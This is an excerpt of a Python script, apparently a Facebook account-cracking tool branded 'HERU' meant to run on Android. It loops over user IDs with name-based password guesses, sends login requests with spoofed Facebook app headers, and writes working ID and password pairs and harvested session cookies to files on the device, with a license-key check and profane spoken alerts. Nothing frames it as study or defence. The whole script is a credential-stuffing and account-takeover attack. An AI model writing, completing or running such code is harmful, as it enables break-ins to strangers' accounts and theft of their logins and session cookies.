...
sys.stdout.write('\x1b]2; HERU\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
def approval():
  ...
  print ("""\033[1;37m----------------------------------------------""")
  try:
    httpCaht = requests.get("https://github.com/Heruteah/Esteme/blob/main/key.txt").text
    if id in httpCaht:
...
def CENTSU():   
    ...
    if select =='1':
        ...
        os.system('xdg-ope https://www.facebook.com/jaymar.dev.00')
        pass
    elif select =='F':
...
class main_CENT():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}>>>>>[HERU]<<<<< | M1 OK ╬ CP {len(oks)}/{len(cps)} | {loop} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\033[97;1m=======================[HERU]======================")
                    oks.append(sid)
                    open('/sdcard/HERU_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/HERU_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+ckkk+'\n')
                    ...
                    break
                     ...
                     cps.append(sid)
                     open('/sdcard/HERU_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[HERU] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);CENTb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={CENTb};{ckkk}"
                    print(f"\r{R} [HERU-OK] {sid} | {ps} {S}")
                    os.system('espeak -a 300 "HEY, SHIT, YOU,  GOT,  A,  FUCK,  id"')
                    oks.append(sid)
                    open('/sdcard/HERU_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/HERU_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{A} [HERU-CP] {sid} | {ps} {S}")
                    os.system('espeak -a 300 " oh shit Cp ID"')
                    cps.append(sid)
                    open('/sdcard/HERU_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\033[97;1m=======================[HERU]======================")
                    oks.append(sid)
                    open('/sdcard/HERU_OK_ids_M4.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/HERU_iDs_COOKiEs_M4.txt','a').write(sid+'|'+ps+'|'+ckkk+'\n')
                    os.system('espeak -a 300 "HEY,  YOU,  GOT,  OK,  id"')
                    break
